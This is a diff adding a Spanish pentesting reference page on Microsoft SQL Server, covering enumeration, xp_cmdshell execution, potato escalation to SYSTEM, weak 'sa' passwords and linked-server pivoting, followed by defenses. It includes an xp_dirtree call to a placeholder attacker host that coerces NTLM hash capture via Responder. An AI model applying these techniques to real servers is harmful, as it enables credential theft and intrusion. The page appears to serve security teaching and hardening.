@@ -1,0 +1,46 @@
+---
+title: MSSQL
+name: Microsoft SQL Server
+summary: La base de datos de los entornos Windows. Acepta cuentas del dominio, ejecuta comandos con xp_cmdshell, captura hashes con xp_dirtree y salta a otros servidores por enlaces.
+date: 2026-11-04
+ports: [1433/tcp, 1434/udp]
+category: database
+tags: [mssql]
+phases:
+  enum: >-
+    Sin credenciales, la negociación NTLM da el **nombre del equipo y del dominio** y el 1434/udp
+    (SQL Browser) lista las instancias y sus puertos. Con acceso, los logins, las bases de datos, a
+    quién puedes **suplantar** (`EXECUTE AS`) y los **linked servers** hacia otros SQL.
+  initial-access: >-
+    Si tu cuenta es `sysadmin` (o puedes suplantar a una que lo sea), **`xp_cmdshell`** ejecuta
+    comandos en el sistema como la cuenta del servicio. Esa cuenta suele tener
+    `SeImpersonatePrivilege`, así que una patata (PrintSpoofer, GodPotato) da SYSTEM.
+  credential-access: >-
+    Prueba `sa` con contraseñas vacías o débiles y las cuentas del dominio que tengas (autenticación
+    de Windows). Sin ser sysadmin, `xp_dirtree '\\TU_IP\x'` obliga a la cuenta del servicio a
+    autenticarse contra Responder: su hash NetNTLMv2 se crackea o se reenvía.
+  lateral: >-
+    Los **linked servers** ejecutan consultas en otro SQL Server con las credenciales guardadas en el
+    enlace, a veces como sysadmin del otro lado. Se encadenan: de un SQL de desarrollo al de producción.
+defense:
+  - Autenticación solo de Windows, sin `sa` habilitado o con una contraseña larga.
+  - "`xp_cmdshell` desactivado y la cuenta del servicio como gMSA sin privilegios de más."
+  - Revisar los permisos de suplantación y las credenciales de los linked servers.
+  - Bloquear las conexiones SMB salientes de los servidores SQL hacia la red de usuarios.
+---
+
+## Qué es
+
+SQL Server escucha en el 1433 (la instancia por defecto) y en puertos dinámicos para las instancias
+con nombre, que anuncia el **SQL Browser** en el 1434/udp. Tiene dos tipos de login: los propios de
+SQL (como `sa`) y los de **Windows**, cuentas del dominio, así que una credencial del dominio puede
+valer aquí.
+
+Además de base de datos, es una pequeña plataforma de ejecución: procedimientos extendidos que tocan
+el sistema de archivos y la red, ensamblados .NET y trabajos del agente.
+
+## Qué buscar
+
+- **Instancias** y versión.
+- **Logins válidos** y si alguno es sysadmin o se puede suplantar.
+- **Linked servers**.
